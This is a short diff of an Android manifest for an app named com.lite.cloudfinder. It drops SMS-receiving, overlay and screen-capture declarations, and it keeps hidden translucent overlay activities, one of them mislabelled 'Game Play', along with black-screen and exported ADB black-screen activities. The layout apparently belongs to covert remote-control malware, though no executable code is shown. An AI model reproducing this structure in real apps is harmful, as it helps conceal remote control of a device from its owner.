@@ -130,9 +130,7 @@
         <package android:name="com.evenwell.powersaving.g3"/>
         <package android:name="com.android.settings"/>
     </queries>
-    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
-
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
     <permission android:name="com.lite.cloudfinder.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
     <uses-permission android:name="com.lite.cloudfinder.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
@@ -166,7 +164,6 @@
             </intent-filter>
         </activity>
         <activity android:excludeFromRecents="true" android:label="Game Play" android:name="com.lite.cloudfinder.activity.OverlayActivity" android:theme="@style/SSR.Transparent"/>
-        <activity android:excludeFromRecents="true" android:exported="false" android:name="com.lite.cloudfinder.activity.ScreenCaptureActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:excludeFromRecents="true" android:name="com.lite.cloudfinder.activity.BlackOverlayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:excludeFromRecents="true" android:name="com.lite.cloudfinder.activity.ConfirmDeviceActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTask" android:name="com.lite.cloudfinder.activity.AdbBlackScreenActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
